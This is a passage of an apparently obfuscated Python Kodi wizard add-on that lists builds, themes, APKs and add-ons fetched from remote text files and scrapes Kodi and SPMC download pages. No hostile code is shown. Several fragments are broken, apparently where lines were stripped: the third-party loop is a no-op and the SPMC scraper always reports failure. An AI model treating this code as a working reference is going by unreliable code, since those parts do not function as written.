		OOOOO00O0O0O00000 ,OOOO00OOOOOOOOOO0 ,OOO00000OOOOO0OOO ,O000O000OO00OOOOO ,O0000O0O00000OO00 ,OOOOOO00OO000OO0O ,OO00OO000000000OO =wiz .buildCount ()#line:2223
		O00OO00O00000000O =False ;OOO0O0000OOO00000 =[]#line:2224
		if THIRDPARTY =='true':#line:2225
			if not THIRD1NAME ==''and not THIRD1URL =='':O00OO00O00000000O =True ;OOO0O0000OOO00000 .append ('1')#line:2226
			if not THIRD2NAME ==''and not THIRD2URL =='':O00OO00O00000000O =True ;OOO0O0000OOO00000 .append ('2')#line:2227
			if not THIRD3NAME ==''and not THIRD3URL =='':O00OO00O00000000O =True ;OOO0O0000OOO00000 .append ('3')#line:2228
		O00O00O00OOO000O0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2229
		OO0000OO0OO00OOO0 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00O00O00OOO000O0 )#line:2230
		if OOOOO00O0O0O00000 ==1 and O00OO00O00000000O ==False :#line:2231
			for OOOOOOOO000OO0000 ,OOO0OOO0O0O0O000O ,O00OOOOO00O00O00O ,OOO0O00O00O00OOO0 ,OO0OOO00O0OO0OO0O ,O000O00OOOOO0O0O0 ,O000OO0O0O0OOO00O ,O0000O0000OO00O0O ,OOO0OOO0O00OOOOOO ,OOO0OO00OOO0O00OO in OO0000OO0OO00OOO0 :#line:2232
				if not SHOWADULT =='true'and OOO0OOO0O00OOOOOO .lower ()=='yes':continue #line:2233
				if not DEVELOPER =='true'and wiz .strTest (OOOOOOOO000OO0000 ):continue #line:2234
				viewBuild (OO0000OO0OO00OOO0 [0 ][0 ])#line:2235
				return #line:2236
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2239
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2240
		if O00OO00O00000000O ==True :#line:2241
			for OO0O00OOOO0O0OO0O in OOO0O0000OOO00000 :#line:2242
				OOOOOOOO000OO0000 =eval ('THIRD%sNAME'%OO0O00OOOO0O0OO0O )#line:2243
		if len (OO0000OO0OO00OOO0 )>=1 :#line:2245
			if SEPERATE =='true':#line:2246
				for OOOOOOOO000OO0000 ,OOO0OOO0O0O0O000O ,O00OOOOO00O00O00O ,OOO0O00O00O00OOO0 ,OO0OOO00O0OO0OO0O ,O000O00OOOOO0O0O0 ,O000OO0O0O0OOO00O ,O0000O0000OO00O0O ,OOO0OOO0O00OOOOOO ,OOO0OO00OOO0O00OO in OO0000OO0OO00OOO0 :#line:2247
					if not SHOWADULT =='true'and OOO0OOO0O00OOOOOO .lower ()=='yes':continue #line:2248
					if not DEVELOPER =='true'and wiz .strTest (OOOOOOOO000OO0000 ):continue #line:2249
					OO0OOOOOO00OOOO0O =createMenu ('install','',OOOOOOOO000OO0000 )#line:2250
					addDir ('[%s] %s (v%s)'%(float (OO0OOO00O0OO0OO0O ),OOOOOOOO000OO0000 ,OOO0OOO0O0O0O000O ),'viewbuild',OOOOOOOO000OO0000 ,description =OOO0OO00OOO0O00OO ,fanart =O0000O0000OO00O0O ,icon =O000OO0O0O0OOO00O ,menu =OO0OOOOOO00OOOO0O ,themeit =THEME2 )#line:2251
			else :#line:2252
				if O000O000OO00OOOOO >0 :#line:2253
					O00OOO0000O0000O0 ='+'if SHOW17 =='false'else '-'#line:2254
					if SHOW17 =='true':#line:2256
						for OOOOOOOO000OO0000 ,OOO0OOO0O0O0O000O ,O00OOOOO00O00O00O ,OOO0O00O00O00OOO0 ,OO0OOO00O0OO0OO0O ,O000O00OOOOO0O0O0 ,O000OO0O0O0OOO00O ,O0000O0000OO00O0O ,OOO0OOO0O00OOOOOO ,OOO0OO00OOO0O00OO in OO0000OO0OO00OOO0 :#line:2258
							if not SHOWADULT =='true'and OOO0OOO0O00OOOOOO .lower ()=='yes':continue #line:2259
							if not DEVELOPER =='true'and wiz .strTest (OOOOOOOO000OO0000 ):continue #line:2260
							O0O0O0000OO0O00OO =int (float (OO0OOO00O0OO0OO0O ))#line:2261
							if O0O0O0000OO0O00OO ==17 :#line:2262
								OO0OOOOOO00OOOO0O =createMenu ('install','',OOOOOOOO000OO0000 )#line:2263
								addDir ('[%s] %s (v%s)'%(float (OO0OOO00O0OO0OO0O ),OOOOOOOO000OO0000 ,OOO0OOO0O0O0O000O ),'viewbuild',OOOOOOOO000OO0000 ,description =OOO0OO00OOO0O00OO ,fanart =O0000O0000OO00O0O ,icon =O000OO0O0O0OOO00O ,menu =OO0OOOOOO00OOOO0O ,themeit =THEME2 )#line:2264
				if O0000O0O00000OO00 >0 :#line:2265
					O00OOO0000O0000O0 ='+'if SHOW18 =='false'else '-'#line:2266
					if SHOW18 =='true':#line:2268
						for OOOOOOOO000OO0000 ,OOO0OOO0O0O0O000O ,O00OOOOO00O00O00O ,OOO0O00O00O00OOO0 ,OO0OOO00O0OO0OO0O ,O000O00OOOOO0O0O0 ,O000OO0O0O0OOO00O ,O0000O0000OO00O0O ,OOO0OOO0O00OOOOOO ,OOO0OO00OOO0O00OO in OO0000OO0OO00OOO0 :#line:2270
							if not SHOWADULT =='true'and OOO0OOO0O00OOOOOO .lower ()=='yes':continue #line:2271
							if not DEVELOPER =='true'and wiz .strTest (OOOOOOOO000OO0000 ):continue #line:2272
							O0O0O0000OO0O00OO =int (float (OO0OOO00O0OO0OO0O ))#line:2273
							if O0O0O0000OO0O00OO ==18 :#line:2274
								OO0OOOOOO00OOOO0O =createMenu ('install','',OOOOOOOO000OO0000 )#line:2275
								addDir ('[%s] %s (v%s)'%(float (OO0OOO00O0OO0OO0O ),OOOOOOOO000OO0000 ,OOO0OOO0O0O0O000O ),'viewbuild',OOOOOOOO000OO0000 ,description =OOO0OO00OOO0O00OO ,fanart =O0000O0000OO00O0O ,icon =O000OO0O0O0OOO00O ,menu =OO0OOOOOO00OOOO0O ,themeit =THEME2 )#line:2276
				if OOO00000OOOOO0OOO >0 :#line:2277
					O00OOO0000O0000O0 ='+'if SHOW16 =='false'else '-'#line:2278
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O00OOO0000O0000O0 ,OOO00000OOOOO0OOO ),'togglesetting','show16',themeit =THEME3 )#line:2279
					if SHOW16 =='true':#line:2280
						for OOOOOOOO000OO0000 ,OOO0OOO0O0O0O000O ,O00OOOOO00O00O00O ,OOO0O00O00O00OOO0 ,OO0OOO00O0OO0OO0O ,O000O00OOOOO0O0O0 ,O000OO0O0O0OOO00O ,O0000O0000OO00O0O ,OOO0OOO0O00OOOOOO ,OOO0OO00OOO0O00OO in OO0000OO0OO00OOO0 :#line:2281
							if not SHOWADULT =='true'and OOO0OOO0O00OOOOOO .lower ()=='yes':continue #line:2282
							if not DEVELOPER =='true'and wiz .strTest (OOOOOOOO000OO0000 ):continue #line:2283
							O0O0O0000OO0O00OO =int (float (OO0OOO00O0OO0OO0O ))#line:2284
							if O0O0O0000OO0O00OO ==16 :#line:2285
								OO0OOOOOO00OOOO0O =createMenu ('install','',OOOOOOOO000OO0000 )#line:2286
								addDir ('[%s] %s (v%s)'%(float (OO0OOO00O0OO0OO0O ),OOOOOOOO000OO0000 ,OOO0OOO0O0O0O000O ),'viewbuild',OOOOOOOO000OO0000 ,description =OOO0OO00OOO0O00OO ,fanart =O0000O0000OO00O0O ,icon =O000OO0O0O0OOO00O ,menu =OO0OOOOOO00OOOO0O ,themeit =THEME2 )#line:2287
				if OOOO00OOOOOOOOOO0 >0 :#line:2288
					O00OOO0000O0000O0 ='+'if SHOW15 =='false'else '-'#line:2289
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O00OOO0000O0000O0 ,OOOO00OOOOOOOOOO0 ),'togglesetting','show15',themeit =THEME3 )#line:2290
					if SHOW15 =='true':#line:2291
						for OOOOOOOO000OO0000 ,OOO0OOO0O0O0O000O ,O00OOOOO00O00O00O ,OOO0O00O00O00OOO0 ,OO0OOO00O0OO0OO0O ,O000O00OOOOO0O0O0 ,O000OO0O0O0OOO00O ,O0000O0000OO00O0O ,OOO0OOO0O00OOOOOO ,OOO0OO00OOO0O00OO in OO0000OO0OO00OOO0 :#line:2292
							if not SHOWADULT =='true'and OOO0OOO0O00OOOOOO .lower ()=='yes':continue #line:2293
							if not DEVELOPER =='true'and wiz .strTest (OOOOOOOO000OO0000 ):continue #line:2294
							O0O0O0000OO0O00OO =int (float (OO0OOO00O0OO0OO0O ))#line:2295
							if O0O0O0000OO0O00OO <=15 :#line:2296
								OO0OOOOOO00OOOO0O =createMenu ('install','',OOOOOOOO000OO0000 )#line:2297
								addDir ('[%s] %s (v%s)'%(float (OO0OOO00O0OO0OO0O ),OOOOOOOO000OO0000 ,OOO0OOO0O0O0O000O ),'viewbuild',OOOOOOOO000OO0000 ,description =OOO0OO00OOO0O00OO ,fanart =O0000O0000OO00O0O ,icon =O000OO0O0O0OOO00O ,menu =OO0OOOOOO00OOOO0O ,themeit =THEME2 )#line:2298
		elif OO00OO000000000OO >0 :#line:2299
			if OOOOOO00OO000OO0O >0 :#line:2300
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2301
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2302
			else :#line:2303
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2304
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2305
	setView ('files','viewType')#line:2306
def viewBuild (OO000O00O00OO000O ):#line:2308
	O0O0O0OO000000O00 =wiz .workingURL (SPEEDFILE )#line:2309
	if not O0O0O0OO000000O00 ==True :#line:2310
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2311
		addFile ('%s'%O0O0O0OO000000O00 ,'',themeit =THEME3 )#line:2312
		return #line:2313
	if wiz .checkBuild (OO000O00O00OO000O ,'version')==False :#line:2314
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2315
		addFile ('%s was not found in the builds list.'%OO000O00O00OO000O ,'',themeit =THEME3 )#line:2316
		return #line:2317
	O000OO000OOOOO000 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2318
	OOO0OOO0O000OO0O0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO000O00O00OO000O ).findall (O000OO000OOOOO000 )#line:2319
	for O0OOOO0OO0OOO0O00 ,O000O0O000OOO00OO ,OOO0OOOOOO0OOOO00 ,O00OO0000000OOO0O ,O00O0O0OO0OOOO00O ,O0O00OOOO00O0O000 ,OOO0OO00O00OO0OOO ,OOO0OO00O0OOO000O ,O0O0O00O0OO0O00OO ,O000OO0OOOOO0O0O0 in OOO0OOO0O000OO0O0 :#line:2320
		O0O00OOOO00O0O000 =O0O00OOOO00O0O000 if wiz .workingURL (O0O00OOOO00O0O000 )else ICON #line:2321
		OOO0OO00O00OO0OOO =OOO0OO00O00OO0OOO if wiz .workingURL (OOO0OO00O00OO0OOO )else FANART #line:2322
		OO00000OO0O00O00O ='%s (v%s)'%(OO000O00O00OO000O ,O0OOOO0OO0OOO0O00 )#line:2323
		if BUILDNAME ==OO000O00O00OO000O and O0OOOO0OO0OOO0O00 >BUILDVERSION :#line:2324
			OO00000OO0O00O00O ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OO00000OO0O00O00O ,BUILDVERSION )#line:2325
		O00000O0OO0O0O00O =int (float (KODIV ));O0O00O00O00O00O00 =int (float (O00OO0000000OOO0O ))#line:2334
		if not O00000O0OO0O0O00O ==O0O00O00O00O00O00 :#line:2335
			if O00000O0OO0O0O00O ==16 and O0O00O00O00O00O00 <=15 :O0OOO0OOO0OOO0000 =False #line:2336
			else :O0OOO0OOO0OOO0000 =True #line:2337
		else :O0OOO0OOO0OOO0000 =False #line:2338
		addFile ('התקנה','install',OO000O00O00OO000O ,'fresh',description =O000OO0OOOOO0O0O0 ,fanart =OOO0OO00O00OO0OOO ,icon =O0O00OOOO00O0O000 ,themeit =THEME1 )#line:2342
		if not O00O0O0OO0OOOO00O =='http://':#line:2345
			if wiz .workingURL (O00O0O0OO0OOOO00O )==True :#line:2346
				addFile (wiz .sep ('THEMES'),'',fanart =OOO0OO00O00OO0OOO ,icon =O0O00OOOO00O0O000 ,themeit =THEME3 )#line:2347
				O000OO000OOOOO000 =wiz .openURL (O00O0O0OO0OOOO00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2348
				OOO0OOO0O000OO0O0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O000OO000OOOOO000 )#line:2349
				for O0OOO0OO0O00OOOO0 ,OO0OOOOO0O0O000OO ,O000O00OO0OO000O0 ,OO000OO0OO000OO0O ,O0O0O00O0OO0OO0OO ,O000OO0OOOOO0O0O0 in OOO0OOO0O000OO0O0 :#line:2350
					if not SHOWADULT =='true'and O0O0O00O0OO0OO0OO .lower ()=='yes':continue #line:2351
					O000O00OO0OO000O0 =O000O00OO0OO000O0 if O000O00OO0OO000O0 =='http://'else O0O00OOOO00O0O000 #line:2352
					OO000OO0OO000OO0O =OO000OO0OO000OO0O if OO000OO0OO000OO0O =='http://'else OOO0OO00O00OO0OOO #line:2353
					addFile (O0OOO0OO0O00OOOO0 if not O0OOO0OO0O00OOOO0 ==BUILDTHEME else "[B]%s (Installed)[/B]"%O0OOO0OO0O00OOOO0 ,'theme',OO000O00O00OO000O ,O0OOO0OO0O00OOOO0 ,description =O000OO0OOOOO0O0O0 ,fanart =OO000OO0OO000OO0O ,icon =O000O00OO0OO000O0 ,themeit =THEME3 )#line:2354
	setView ('files','viewType')#line:2355
def viewThirdList (O0OOOO00O000O0OOO ):#line:2357
	OOOOO0000OO0O000O =eval ('THIRD%sNAME'%O0OOOO00O000O0OOO )#line:2358
	OO0000O0OO0OOOOOO =eval ('THIRD%sURL'%O0OOOO00O000O0OOO )#line:2359
	OO0O0OO000OO00OO0 =wiz .workingURL (OO0000O0OO0OOOOOO )#line:2360
	if not OO0O0OO000OO00OO0 ==True :#line:2361
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2362
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2363
	else :#line:2364
		O00OOOO00O0OOO00O ,O00OO000O0O00OOOO =wiz .thirdParty (OO0000O0OO0OOOOOO )#line:2365
		addFile ("[B]%s[/B]"%OOOOO0000OO0O000O ,'',themeit =THEME3 )#line:2366
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2367
		if O00OOOO00O0OOO00O :#line:2368
			for OOOOO0000OO0O000O ,O00O0OOO0OO00O0O0 ,OO0000O0OO0OOOOOO ,OOO0O0O000OOO00OO ,OOO00O0OOOOO0OO00 ,OOOO0000O0OOOO0O0 ,OO0O0O00OO0O00000 ,O0OO000O00O0O000O in O00OO000O0O00OOOO :#line:2369
				if not SHOWADULT =='true'and OO0O0O00OO0O00000 .lower ()=='yes':continue #line:2370
				addFile ("[%s] %s v%s"%(OOO0O0O000OOO00OO ,OOOOO0000OO0O000O ,O00O0OOO0OO00O0O0 ),'installthird',OOOOO0000OO0O000O ,OO0000O0OO0OOOOOO ,icon =OOO00O0OOOOO0OO00 ,fanart =OOOO0000O0OOOO0O0 ,description =O0OO000O00O0O000O ,themeit =THEME2 )#line:2371
		else :#line:2372
			for OOOOO0000OO0O000O ,OO0000O0OO0OOOOOO ,OOO00O0OOOOO0OO00 ,OOOO0000O0OOOO0O0 ,O0OO000O00O0O000O in O00OO000O0O00OOOO :#line:2373
				addFile (OOOOO0000OO0O000O ,'installthird',OOOOO0000OO0O000O ,OO0000O0OO0OOOOOO ,icon =OOO00O0OOOOO0OO00 ,fanart =OOOO0000O0OOOO0O0 ,description =O0OO000O00O0O000O ,themeit =THEME2 )#line:2374
def editThirdParty (O0OO0O000O0O0OOOO ):#line:2376
	OOO0O0OO0OOO0OOO0 =eval ('THIRD%sNAME'%O0OO0O000O0O0OOOO )#line:2377
	O00O00OO00O000O00 =eval ('THIRD%sURL'%O0OO0O000O0O0OOOO )#line:2378
	O00O00000O0000000 =wiz .getKeyboard (OOO0O0OO0OOO0OOO0 ,'Enter the Name of the Wizard')#line:2379
	OO00OO00OOO00O0OO =wiz .getKeyboard (O00O00OO00O000O00 ,'Enter the URL of the Wizard Text')#line:2380
	wiz .setS ('wizard%sname'%O0OO0O000O0O0OOOO ,O00O00000O0000000 )#line:2382
	wiz .setS ('wizard%surl'%O0OO0O000O0O0OOOO ,OO00OO00OOO00O0OO )#line:2383
def apkScraper (name =""):#line:2385
	if name =='kodi':#line:2386
		O000OO0000OO0O0OO ='http://mirrors.kodi.tv/releases/android/arm/'#line:2387
		OO00O00OO0O0O0000 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2388
		O00O0OO0000OO000O =wiz .openURL (O000OO0000OO0O0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2389
		OO0O00O00O0O00O00 =wiz .openURL (OO00O00OO0O0O0000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2390
		O0000O000O0OO0OOO =0 #line:2391
		OOOOO0OOOOO0000OO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O00O0OO0000OO000O )#line:2392
		O00O000O00O00O0O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO0O00O00O0O00O00 )#line:2393
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2395
		OOO00O0OO0OOOO00O =False #line:2396
		for O000O00O00OO0OO0O ,name ,O000OOO0O0OO00000 ,OOOO00O00OO0O00O0 in OOOOO0OOOOO0000OO :#line:2397
			if O000O00O00OO0OO0O in ['../','old/']:continue #line:2398
			if not O000O00O00OO0OO0O .endswith ('.apk'):continue #line:2399
			if not O000O00O00OO0OO0O .find ('_')==-1 and OOO00O0OO0OOOO00O ==True :continue #line:2400
			try :#line:2401
				OOOOO00OO0O0OO0OO =name .split ('-')#line:2402
				if not O000O00O00OO0OO0O .find ('_')==-1 :#line:2403
					OOO00O0OO0OOOO00O =True #line:2404
					OOOOOO0OO00O00O00 ,OOOOO0OO0000O0OOO =OOOOO00OO0O0OO0OO [2 ].split ('_')#line:2405
				else :#line:2406
					OOOOOO0OO00O00O00 =OOOOO00OO0O0OO0OO [2 ]#line:2407
					OOOOO0OO0000O0OOO =''#line:2408
				OO0OO00OO0OOOO00O ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOO00OO0O0OO0OO [0 ].title (),OOOOO00OO0O0OO0OO [1 ],OOOOO0OO0000O0OOO .upper (),OOOOOO0OO00O00O00 ,COLOR2 ,O000OOO0O0OO00000 .replace (' ',''),COLOR1 ,OOOO00O00OO0O00O0 )#line:2409
				OO0O0O0O0000OOO00 =urljoin (O000OO0000OO0O0OO ,O000O00O00OO0OO0O )#line:2410
				addFile (OO0OO00OO0OOOO00O ,'apkinstall',"%s v%s%s %s"%(OOOOO00OO0O0OO0OO [0 ].title (),OOOOO00OO0O0OO0OO [1 ],OOOOO0OO0000O0OOO .upper (),OOOOOO0OO00O00O00 ),OO0O0O0O0000OOO00 )#line:2411
				O0000O000O0OO0OOO +=1 #line:2412
			except :#line:2413
				wiz .log ("Error on: %s"%name )#line:2414
		for O000O00O00OO0OO0O ,name ,O000OOO0O0OO00000 ,OOOO00O00OO0O00O0 in O00O000O00O00O0O0 :#line:2416
			if O000O00O00OO0OO0O in ['../','old/']:continue #line:2417
			if not O000O00O00OO0OO0O .endswith ('.apk'):continue #line:2418
			if not O000O00O00OO0OO0O .find ('_')==-1 :continue #line:2419
			try :#line:2420
				OOOOO00OO0O0OO0OO =name .split ('-')#line:2421
				OO0OO00OO0OOOO00O ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOO00OO0O0OO0OO [0 ].title (),OOOOO00OO0O0OO0OO [1 ],OOOOO00OO0O0OO0OO [2 ],COLOR2 ,O000OOO0O0OO00000 .replace (' ',''),COLOR1 ,OOOO00O00OO0O00O0 )#line:2422
				OO0O0O0O0000OOO00 =urljoin (OO00O00OO0O0O0000 ,O000O00O00OO0OO0O )#line:2423
				addFile (OO0OO00OO0OOOO00O ,'apkinstall',"%s v%s %s"%(OOOOO00OO0O0OO0OO [0 ].title (),OOOOO00OO0O0OO0OO [1 ],OOOOO00OO0O0OO0OO [2 ]),OO0O0O0O0000OOO00 )#line:2424
				O0000O000O0OO0OOO +=1 #line:2425
			except :#line:2426
				wiz .log ("Error on: %s"%name )#line:2427
		if O0000O000O0OO0OOO ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2428
	elif name =='spmc':#line:2429
		O00O00000O0O0O0O0 ='https://github.com/koying/SPMC/releases'#line:2430
		O00O0OO0000OO000O =wiz .openURL (O00O00000O0O0O0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2431
		O0000O000O0OO0OOO =0 #line:2432
		OOOOO0OOOOO0000OO =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O00O0OO0000OO000O )#line:2433
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2435
		for name ,O0OO0O000OO000OO0 in OOOOO0OOOOO0000OO :#line:2437
			O0OO0OO0OO0OOOOOO =''#line:2438
			O00O000O00O00O0O0 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O0OO0O000OO000OO0 )#line:2439
			for OOOO0O0O00OOO00OO ,OO0000OO0000O0000 ,O00O00O0OO0O00OO0 in O00O000O00O00O0O0 :#line:2440
				if O00O00O0OO0O00OO0 .find ('armeabi')==-1 :continue #line:2441
				if O00O00O0OO0O00OO0 .find ('launcher')>-1 :continue #line:2442
				O0OO0OO0OO0OOOOOO =urljoin ('https://github.com',OOOO0O0O00OOO00OO )#line:2443
				break #line:2444
		if O0000O000O0OO0OOO ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2446
def apkMenu (url =None ):#line:2448
	if url ==None :#line:2449
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2452
	if not APKFILE =='http://':#line:2453
		if url ==None :#line:2454
			OOOOOO0OO000OO00O =wiz .workingURL (APKFILE )#line:2455
			O000O00O0OO0OO0O0 =uservar .APKFILE #line:2456
		else :#line:2457
			OOOOOO0OO000OO00O =wiz .workingURL (url )#line:2458
			O000O00O0OO0OO0O0 =url #line:2459
		if OOOOOO0OO000OO00O ==True :#line:2460
			OO00O0O00O00O0OOO =wiz .openURL (O000O00O0OO0OO0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2461
			O0000O0OOOOOO0OO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00O0O00O00O0OOO )#line:2462
			if len (O0000O0OOOOOO0OO0 )>0 :#line:2463
				O00O00O0000OO000O =0 #line:2464
				for O0O00OOO0OOOO0OOO ,O0O0000O0O00O0O0O ,url ,OOOOO0O0O00OO000O ,OOO000O0O00O0OOO0 ,OO0O00O000000OO0O ,O00OO000OO0000OO0 in O0000O0OOOOOO0OO0 :#line:2465
					if not SHOWADULT =='true'and OO0O00O000000OO0O .lower ()=='yes':continue #line:2466
					if O0O0000O0O00O0O0O .lower ()=='yes':#line:2467
						O00O00O0000OO000O +=1 #line:2468
						addDir ("[B]%s[/B]"%O0O00OOO0OOOO0OOO ,'apk',url ,description =O00OO000OO0000OO0 ,icon =OOOOO0O0O00OO000O ,fanart =OOO000O0O00O0OOO0 ,themeit =THEME3 )#line:2469
					else :#line:2470
						O00O00O0000OO000O +=1 #line:2471
						addFile (O0O00OOO0OOOO0OOO ,'apkinstall',O0O00OOO0OOOO0OOO ,url ,description =O00OO000OO0000OO0 ,icon =OOOOO0O0O00OO000O ,fanart =OOO000O0O00O0OOO0 ,themeit =THEME2 )#line:2472
					if O00O00O0000OO000O <1 :#line:2473
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2474
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2475
		else :#line:2476
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2477
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2478
			addFile ('%s'%OOOOOO0OO000OO00O ,'',themeit =THEME3 )#line:2479
		return #line:2480
	else :wiz .log ("[APK Menu] No APK list added.")#line:2481
	setView ('files','viewType')#line:2482
def addonMenu (url =None ):#line:2484
	if not ADDONFILE =='http://':#line:2485
		if url ==None :#line:2486
			OO00OOOO0O000OO0O =wiz .workingURL (ADDONFILE )#line:2487
			OO0O00O0O00O00OOO =uservar .ADDONFILE #line:2488
		else :#line:2489
			OO00OOOO0O000OO0O =wiz .workingURL (url )#line:2490
			OO0O00O0O00O00OOO =url #line:2491
		if OO00OOOO0O000OO0O ==True :#line:2492
			OOOO0OO0000000OO0 =wiz .openURL (OO0O00O0O00O00OOO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2493
			OOO00O0OO0O00O0O0 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOO0OO0000000OO0 )#line:2494
			if len (OOO00O0OO0O00O0O0 )>0 :#line:2495
				OO0OOO00O0O0O0O00 =0 #line:2496
				for OOO0000O00O0O0O00 ,OOOO0O0O00OO000O0 ,url ,OO000O000O0OO00OO ,O00O00O000O00O0O0 ,OO00O00OOOOO000O0 ,OO000O00OO00O00O0 ,O00O0OO0OO0OOO0OO ,O0O00OO0O00000O00 ,O0000OO00O0OOOOOO in OOO00O0OO0O00O0O0 :#line:2497
					if OOOO0O0O00OO000O0 .lower ()=='section':#line:2498
						OO0OOO00O0O0O0O00 +=1 #line:2499
						addDir ("[B]%s[/B]"%OOO0000O00O0O0O00 ,'addons',url ,description =O0000OO00O0OOOOOO ,icon =OO000O00OO00O00O0 ,fanart =O00O0OO0OO0OOO0OO ,themeit =THEME3 )#line:2500
					else :#line:2501
						if not SHOWADULT =='true'and O0O00OO0O00000O00 .lower ()=='yes':continue #line:2502
						try :#line:2503
							OO0O0OO0O0OOO0000 =xbmcaddon .Addon (id =OOOO0O0O00OO000O0 ).getAddonInfo ('path')#line:2504
							if os .path .exists (OO0O0OO0O0OOO0000 ):#line:2505
								OOO0000O00O0O0O00 ="[COLOR green][Installed][/COLOR] %s"%OOO0000O00O0O0O00 #line:2506
						except :#line:2507
							pass #line:2508
						OO0OOO00O0O0O0O00 +=1 #line:2509
						addFile (OOO0000O00O0O0O00 ,'addoninstall',OOOO0O0O00OO000O0 ,OO0O00O0O00O00OOO ,description =O0000OO00O0OOOOOO ,icon =OO000O00OO00O00O0 ,fanart =O00O0OO0OO0OOO0OO ,themeit =THEME2 )#line:2510
					if OO0OOO00O0O0O0O00 <1 :#line:2511
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2512
			else :#line:2513
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2514
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2515
		else :#line:2516
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2517
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2518
			addFile ('%s'%OO00OOOO0O000OO0O ,'',themeit =THEME3 )#line:2519
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2520
	setView ('files','viewType')#line:2521
def addonInstaller (O0O0O0O0O00OO0000 ,OOO0O00OO00OOOO00 ):#line:2523
	if not ADDONFILE =='http://':#line:2524
		O0O0OO000OOO0OO0O =wiz .workingURL (OOO0O00OO00OOOO00 )#line:2525
		if O0O0OO000OOO0OO0O ==True :#line:2526
			OOO00OO0OOO0O00O0 =wiz .openURL (OOO0O00OO00OOOO00 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2527
